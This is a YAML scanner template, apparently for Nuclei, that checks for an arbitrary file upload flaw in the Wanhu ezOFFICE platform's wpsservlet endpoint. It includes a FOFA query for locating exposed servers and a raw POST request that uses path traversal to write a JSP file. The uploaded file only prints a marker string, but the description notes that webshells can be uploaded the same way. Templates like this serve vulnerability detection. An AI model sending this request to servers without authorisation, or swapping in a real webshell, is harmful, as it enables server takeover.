id: ezoffice_wpsservlet
info:
  name: 万户协同办公平台ezoffice wpsservlet接口任意文件上传
  author: mike
  severity: info
  description: 万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户ezoffice协同管理平台 wpsservlet接口存在任意文件上传漏洞，攻击者可通过此漏洞上传webshell木马，获取服务器权限。
  reference: xxx
  remediation: xxx
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="万户网络-ezOFFICE"
http:
  - raw:
      - |
        POST /defaultroot/wpsservlet?option=saveNewFile&newdocId=check&dir=../platform/portal/layout/&fileType=.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        DNT: 1
        Connection: close
        Upgrade-Insecure-Requests: 1
        Content-Type: multipart/form-data; boundary=55aeb894de1521afe560c924fad7c6fb
        Content-Length: 200

        --55aeb894de1521afe560c924fad7c6fb
        Content-Disposition: form-data; name="NewFile"; filename="mikes.jsp"

        <% out.print("20231205");%>
        --55aeb894de1521afe560c924fad7c6fb--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "20231205"
